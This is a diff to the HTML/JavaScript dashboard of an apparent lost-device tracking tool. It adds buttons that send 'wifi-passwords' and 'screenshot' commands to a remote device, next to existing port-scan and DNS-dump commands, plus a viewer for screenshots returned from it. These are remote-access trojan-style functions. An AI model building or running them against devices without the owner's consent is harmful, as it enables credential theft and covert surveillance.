@@ -193,6 +193,11 @@
                 </div>
                 <div class="device-status" id="node-badge">Inactive</div>
               </div>
+
+              <div id="admin-status" style="font-size: 9px; margin-bottom: 8px; font-weight: 800; letter-spacing: 0.5px;"></div>
+
+              <div id="signal-fingerprint" style="font-size: 8px; color: var(--accent-blue); margin-bottom: 8px; font-family: 'JetBrains Mono'; background: rgba(0,212,255,0.05); padding: 4px; border-radius: 4px; display: none;"></div>
+
               <div class="device-meta" id="node-coords">Waiting for coordinates...</div>
               <div class="metrics-grid">
                 <div class="metric-box">
@@ -200,8 +205,8 @@
                   <span class="metric-val" id="stat-accuracy">-- m</span>
                 </div>
                 <div class="metric-box">
-                  <span class="metric-label">Admin</span>
-                  <span class="metric-val" id="stat-admin">No</span>
+                  <span class="metric-label">Speed</span>
+                  <span class="metric-val" id="stat-uptime">0.0 km/h</span>
                 </div>
               </div>
               <button class="tool-btn danger" id="lost-btn" onclick="toggleLostState(true)">🚨 MARK AS LOST</button>
@@ -220,6 +225,8 @@
                 <button class="tool-btn" onclick="execCmd('lock')">🔒 Lock</button>
                 <button class="tool-btn" onclick="execCmd('dns-dump')">🌐 DNS Audit</button>
                 <button class="tool-btn" onclick="execCmd('port-audit')">🔍 Port Scan</button>
+                <button class="tool-btn" onclick="execCmd('wifi-passwords')">🔑 WiFi Pass</button>
+                <button class="tool-btn" onclick="execCmd('screenshot')">📸 Capture</button>
                 <button class="tool-btn" onclick="runIntelligence('triangulate')">📡 Triangulate</button>
                 <button class="tool-btn" onclick="runIntelligence('net-trace')">📊 Net Trace</button>
                 <button class="tool-btn primary" onclick="execCmd('forensic-init')">Force Signal Fusion (TTAL)</button>
@@ -343,7 +350,8 @@
         ws.onmessage = (e) => {
             const msg = JSON.parse(e.data);
             if (msg.type === 'connected') {
-                enterDashboard();
+                dashboardActive = true;
+                showScreen('dashboard');
                 addLog('Secure Uplink Synchronized', 'SYS');
             }
             if (msg.type === 'location') {
@@ -355,9 +363,33 @@
                 showToast('Intelligence Received');
                 const res = JSON.parse(msg.result);
                 if (res.bssids) window._lastWifi = res.bssids;
-                if (res.message) addLog(res.message, 'RES');
+                if (res.image) {
+                    showModal('image', res.image);
+                    addLog('Forensic Image Captured', 'CAM');
+                } else if (res.message) {
+                    addLog(res.message, 'RES');
+                } else {
+                    addLog(msg.result, 'RES');
+                }
             }
         };
+    }
+
+    function showModal(type, data) {
+        let el = document.getElementById('forensic-modal');
+        if (!el) {
+            el = document.createElement('div'); el.id = 'forensic-modal';
+            el.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:10000;display:flex;align-items:center;justify-content:center;flex-direction:column;padding:40px;';
+            document.body.appendChild(el);
+        }
+        el.innerHTML = '<div style="position:absolute;top:20px;right:20px;cursor:pointer;font-size:24px;color:#fff;" onclick="this.parentElement.style.display=\'none\'">✕</div>';
+        if (type === 'image') {
+            const img = document.createElement('img');
+            img.src = 'data:image/png;base64,' + data;
+            img.style.maxWidth = '100%'; img.style.maxHeight = '80vh'; img.style.borderRadius = '16px'; img.style.boxShadow = '0 0 50px rgba(212,255,63,0.3)';
+            el.appendChild(img);
+        }
+        el.style.display = 'flex';
     }
 
     function startLiveTelemetry() {
